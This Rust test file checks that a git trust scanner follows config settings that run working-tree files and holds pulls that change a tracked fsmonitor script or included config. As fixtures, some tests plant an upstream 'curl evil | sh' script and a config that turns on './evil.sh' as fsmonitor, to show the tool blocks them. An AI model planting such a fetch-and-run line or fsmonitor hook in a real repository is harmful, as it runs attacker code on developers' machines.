//! Config programs that run files from the working tree: each kind of setting follows the
//! files it names, and a pull or checkout that brings in another version of a tracked
//! fsmonitor script or included config file is held, as a tracked hooks folder is.

use super::super::compare::{Refused, check};
use super::super::pull::{Pull, PullRun, run_pinned};
use super::super::{Follow, TrustScan, follow, scan_now};
use super::*;
use crate::gitcli::args;
use crate::settings::SavedTrust;
use crate::testutil::*;

fn scan_of(dir: &Path) -> TrustScan {
    scan_now(&Repository::open(dir).unwrap())
}

fn trusted(dir: &Path) -> SavedTrust {
    SavedTrust::trusted(Some(scan_of(dir).print()))
}

/// The places in the working tree that the one setting `key` = `value` makes the scan follow.
fn followed(dir: &Path, key: &str, value: &str) -> Vec<String> {
    let repo = Repository::open(dir).unwrap();
    let workdir = repo.workdir().unwrap().to_path_buf();
    let mut config = vec![ConfigCommand { key: key.into(), value: value.into() }];
    let mut out: Vec<String> = Vec::new();
    for p in scan(&repo, &mut config) {
        // "" is the whole working tree.
        for rel in follow::inside(&repo, &workdir, &p) {
            if !out.contains(&rel) {
                out.push(rel);
            }
        }
    }
    out.sort();
    out
}

fn executable(path: &Path) {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let _ = path;
}

fn cleanup(dirs: &[&Path]) {
    for d in dirs {
        let _ = std::fs::remove_dir_all(d);
    }
}

#[test]
fn each_kind_of_setting_that_runs_a_file_in_the_working_tree_follows_it() {
    let dir = scratch_repo("programs-kinds");
    // A bare word names a file only when the working tree has one by that name.
    write(&dir, "present", "x\n");
    std::fs::create_dir_all(dir.join("lib")).unwrap();
    let cases: &[(&str, &str, &[&str])] = &[
        ("core.fsmonitor", "./tools/fsm.sh", &["tools/fsm.sh"]),
        ("filter.x.smudge", "python tools/smudge.py %f", &["tools/smudge.py"]),
        ("filter.x.clean", "sh -c './a.sh; ./b.sh'", &["a.sh", "b.sh"]),
        // An unquoted `\`: the shell drops it, a program on Windows reads a separator.
        ("filter.x.process", r"tools\proc.exe", &["tools/proc.exe", "toolsproc.exe"]),
        ("filter.x.process", r"'tools\proc.exe'", &["tools/proc.exe"]),
        // The working folder written with quotes around it, as the space-safe form has it.
        ("filter.x.smudge", "sh \"$(git rev-parse --show-toplevel)\"/tools/smudge.sh", &["tools/smudge.sh"]),
        ("filter.x.smudge", "sh \"$PWD\"/a.sh", &["a.sh"]),
        ("filter.x.smudge", "sh \"${PWD}\"/b.sh", &["b.sh"]),
        ("filter.x.smudge", "sh \"$(pwd)\"/c.sh", &["c.sh"]),
        // A glob: the nearest folder the working tree has covers whatever it matches.
        ("filter.x.clean", "sh ./t*/x.sh", &["", "t*/x.sh"]),
        ("filter.x.clean", "sh lib/*.sh", &["lib", "lib/*.sh"]),
        ("filter.x.clean", "sh *.sh", &[""]),
        ("filter.x.clean", "sh lib/$NAME.sh", &["lib"]),
        // Shell syntax is no glob: a function in a credential helper follows nothing.
        ("credential.helper", "!f() { echo \"password=$TOKEN\"; }; f", &[]),
        ("filter.x.clean", "[[ -n $X ]] && sh lib/ok.sh", &["lib/ok.sh"]),
        // A stream name is the file it opens.
        ("core.fsmonitor", "./tools/fsm.sh::$DATA", &["tools/fsm.sh"]),
        // Whatever a substitution says, a `/` right after it is read from the working tree.
        ("filter.x.smudge", "sh `git rev-parse --show-toplevel`/tools/bt.sh", &["tools/bt.sh"]),
        ("filter.x.smudge", "sh \"`git rev-parse --show-toplevel`\"/tools/bq.sh", &["tools/bq.sh"]),
        ("filter.x.smudge", "sh $( git rev-parse --show-toplevel )/tools/sp.sh", &["tools/sp.sh"]),
        ("filter.x.smudge", "sh $(git  rev-parse  --show-toplevel)/tools/ds.sh", &["tools/ds.sh"]),
        ("filter.x.smudge", "sh $(git rev-parse --show-superproject-working-tree)/sw.sh", &["sw.sh"]),
        ("filter.x.smudge", "sh ${PWD%/}/pw.sh", &["pw.sh"]),
        // An escaped space stays in the word.
        ("core.fsmonitor", r"./my\ fsm.sh", &["my", "my fsm.sh"]),
        ("diff.x.textconv", "present", &["present"]),
        ("diff.x.command", "\"$PWD/tools/diff me.sh\" --x", &["tools/diff", "tools/diff me.sh"]),
        ("merge.x.driver", "tools/merge.sh %O %A %B", &["tools/merge.sh"]),
        ("core.sshCommand", "ssh -i ./keys/id -o ProxyCommand=./bin/proxy", &["bin/proxy", "keys/id"]),
        ("credential.helper", "!./bin/creds", &["bin/creds"]),
        ("gpg.program", "bin/gpg", &["bin/gpg"]),
        ("core.editor", "../elsewhere/edit.sh", &[]),
        ("core.editor", "./edit.sh --wait", &["edit.sh"]),
        ("alias.lfs", "!sh ./tools/lfs.sh", &["tools/lfs.sh"]),
        ("remote.origin.url", "ext::./bin/transport %S", &["bin/transport"]),
        ("url.ext::./bin/t.insteadOf", "https://example.com/", &["bin/t"]),
        ("submodule.x.update", "!$(git rev-parse --show-toplevel)/bin/update", &["bin/update"]),
        ("difftool.x.path", "bin/difftool", &["bin/difftool"]),
        // What names no file in the working tree follows nothing.
        ("filter.lfs.clean", "git-lfs clean -- %f", &[]),
        ("filter.lfs.process", "git-lfs filter-process", &[]),
        ("core.editor", "code --wait", &[]),
        ("credential.helper", "store", &[]),
        ("core.sshCommand", "ssh -o ControlPath=~/.ssh/cm-%r", &[]),
        // A variable's value may be the working folder: an untracked `.ssh/id` there.
        ("core.sshCommand", "ssh -i $HOME/.ssh/id", &[".ssh/id"]),
        ("remote.origin.url", "https://example.com/a/b.git", &[]),
        ("diff.x.textconv", ".", &[]),
        ("core.fsmonitor", ".git/fsm.sh", &[]),
        ("core.hooksPath", ".githooks", &[]),
    ];
    for (key, value, want) in cases {
        assert_eq!(followed(&dir, key, value), *want, "{key} = {value}");
    }
    // A `:` is a name character outside Windows, where both readings count; on Windows the
    // part before it is what opens. Quoted, a sed expression is no glob, only made-up paths.
    let (colon, sed): (&[&str], &[&str]) =
        if cfg!(windows) { (&["tools"], &["s/[["]) } else { (&["tools", "tools:v2/x.sh"], &["s/[[", "s/[[:space:]]*$"]) };
    assert_eq!(followed(&dir, "filter.x.clean", "sh tools:v2/x.sh"), colon);
    assert_eq!(followed(&dir, "filter.x.clean", "sed -e 's/[[:space:]]*$//'"), sed);
    // An absolute path into the working tree counts, one elsewhere doesn't.
    let inside = dir.join("bin").join("abs.sh");
    assert_eq!(followed(&dir, "gpg.program", &inside.display().to_string()), ["bin/abs.sh"]);
    let outside = dir.parent().unwrap().join("elsewhere.sh");
    assert!(followed(&dir, "gpg.program", &outside.display().to_string()).is_empty());
    cleanup(&[&dir]);
}

#[test]
fn a_repository_whose_programs_are_installed_elsewhere_keeps_its_print() {
    let dir = scratch_repo("programs-lfs");
    git(&dir, &["config", "filter.lfs.clean", "git-lfs clean -- %f"]);
    git(&dir, &["config", "filter.lfs.process", "git-lfs filter-process"]);
    let s = scan_of(&dir);
    assert!(s.follows.is_empty(), "{:?}", s.follows);
    assert_eq!(s.config.len(), 2);
    cleanup(&[&dir]);
}

#[test]
fn a_credential_helper_function_keeps_its_print_across_a_pull() {
    let (work, bare) = with_origin("programs-helper");
    git(&work, &["config", "credential.helper", "!f() { echo \"password=$TOKEN\"; }; f"]);
    let s = scan_of(&work);
    assert!(s.follows.is_empty(), "shell syntax is no path: {:?}", s.follows);
    let saved = trusted(&work);
    remote_commit(&bare, "main", "b.txt", "b\n");
    git(&work, &["pull", "-q", "--ff-only"]);
    assert!(work.join("b.txt").exists());
    assert!(trust_covers(&saved, &scan_of(&work)), "an unrelated change asks nothing");
    cleanup(&[&work, &bare]);
}

/// A repository with origin whose `core.fsmonitor` is its tracked `tools/fsm.sh`.
fn tracked_fsmonitor(name: &str) -> (PathBuf, PathBuf) {
    tracked_fsmonitor_as(name, "./tools/fsm.sh")
}

/// `tracked_fsmonitor`, with `core.fsmonitor` set to `value`.
fn tracked_fsmonitor_as(name: &str, value: &str) -> (PathBuf, PathBuf) {
    let (work, bare) = with_origin(name);
    std::fs::create_dir_all(work.join("tools")).unwrap();
    write(&work, "tools/fsm.sh", "#!/bin/sh\nexit 1\n");
    executable(&work.join("tools/fsm.sh"));
    git(&work, &["add", "."]);
    git(&work, &["commit", "-q", "-m", "fsmonitor"]);
    git(&work, &["push", "-q", "origin", "main"]);
    git(&work, &["config", "core.fsmonitor", value]);
    (work, bare)
}

fn pull_ff(work: &Path, saved: &SavedTrust) -> PullRun {
    let follows = scan_of(work).follows;
    let mut git = |a: &[String], input: &str, _: &[(&str, &str)]| crate::gitcli::run_with_input(work, a, input, crate::gitcli::NO_PROMPTS);
    run_pinned(work, &Pull::of(&args(&["pull", "--ff-only"])).unwrap(), &follows, Some(saved), None, &mut git)
}

#[test]
fn a_tracked_fsmonitor_script_changed_by_a_pull_is_held() {
    let (work, bare) = tracked_fsmonitor("programs-fsmonitor");
    let s = scan_of(&work);
    let repo = Repository::open(&work).unwrap();
    let id = repo.head().unwrap().peel_to_tree().unwrap().get_path(Path::new("tools/fsm.sh")).unwrap().id();
    let tracked = Follow { path: "tools/fsm.sh".into(), tracked: Some(("tools/fsm.sh".into(), id)), hooks: false };
    assert_eq!(s.follows, [tracked], "the script's version is in the print");
    let saved = trusted(&work);
    // Upstream changed something else: the pull runs.
    remote_commit(&bare, "main", "b.txt", "b\n");
    assert!(matches!(pull_ff(&work, &saved), PullRun::Ran { ok: true, .. }));
    assert!(work.join("b.txt").exists());
    // Upstream changed the script: git would run the new one in the merge's own index refresh.
    remote_commit(&bare, "main", "tools/fsm.sh", "#!/bin/sh\ncurl evil | sh\n");
    let head = repo.head().unwrap().target();
    let PullRun::Refused { refused: Refused::Held(inc), .. } = pull_ff(&work, &saved) else { panic!("held") };
    assert_eq!(inc.follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["tools/fsm.sh"]);
    assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
    assert!(!std::fs::read_to_string(work.join("tools/fsm.sh")).unwrap().contains("evil"));
    // A checkout that wrote it anyway is another print: the next scan asks again.
    git(&work, &["-c", "core.fsmonitor=false", "merge", "-q", "--ff-only", "origin/main"]);
    assert!(!trust_covers(&saved, &scan_of(&work)));
    cleanup(&[&work, &bare]);
}

#[test]
fn a_script_named_after_a_quoted_working_folder_is_held_when_a_pull_changes_it() {
    let (work, bare) = tracked_fsmonitor_as("programs-quoted", "sh \"$(git rev-parse --show-toplevel)\"/tools/fsm.sh");
    assert_eq!(scan_of(&work).follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["tools/fsm.sh"]);
    let saved = trusted(&work);
    remote_commit(
        &bare,
        "main",
        "tools/fsm.sh",
        "#!/bin/sh
curl evil | sh
",
    );
    let head = Repository::open(&work).unwrap().head().unwrap().target();
    let PullRun::Refused { refused: Refused::Held(_), .. } = pull_ff(&work, &saved) else { panic!("held") };
    assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
    cleanup(&[&work, &bare]);
}

fn trust_covers(saved: &SavedTrust, now: &TrustScan) -> bool {
    super::super::allows(Some(saved), now)
}

#[test]
fn a_tracked_include_file_asks_and_follows_the_branch() {
    let dir = scratch_repo("programs-include");
    write(&dir, "shared.cfg", "[diff]\n\tcolorMoved = zebra\n");
    git(&dir, &["add", "."]);
    git(&dir, &["commit", "-q", "-m", "shared config"]);
    git(&dir, &["config", "include.path", "../shared.cfg"]);
    let s = scan_of(&dir);
    // The branch now chooses settings: a reason to ask by itself.
    assert!(s.config.contains(&ConfigCommand { key: "include.path".into(), value: "../shared.cfg".into() }), "{:?}", s.config);
    assert!(!s.is_empty());
    assert_eq!(s.follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["shared.cfg"]);
    let saved = trusted(&dir);
    // Another commit whose shared.cfg turns on an fsmonitor script, made from objects only.
    let repo = Repository::open(&dir).unwrap();
    let head = repo.head().unwrap().peel_to_commit().unwrap();
    let blob = repo.blob(b"[core]\n\tfsmonitor = ./evil.sh\n").unwrap();
    let mut tb = repo.treebuilder(Some(&head.tree().unwrap())).unwrap();
    tb.insert("shared.cfg", blob, 0o100644).unwrap();
    let tree = repo.find_tree(tb.write().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let side = repo.commit(None, &sig, &sig, "evil", &tree, &[&head]).unwrap();
    assert_eq!(check(&repo, &s.follows, Some(&saved), &[head.id()]), Ok(()), "the trusted version");
    let Err(Refused::Held(inc)) = check(&repo, &s.follows, Some(&saved), &[side]) else { panic!("held") };
    assert_eq!(inc.follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["shared.cfg"]);
    // An include outside the working tree (in the git dir) is not the branch's.
    git(&dir, &["config", "--unset", "include.path"]);
    std::fs::write(dir.join(".git/extra.cfg"), "[diff]\n\tcolorMoved = plain\n").unwrap();
    git(&dir, &["config", "include.path", "extra.cfg"]);
    let s = scan_of(&dir);
    assert!(s.follows.is_empty() && s.config.is_empty(), "{s:?}");
    cleanup(&[&dir]);
}
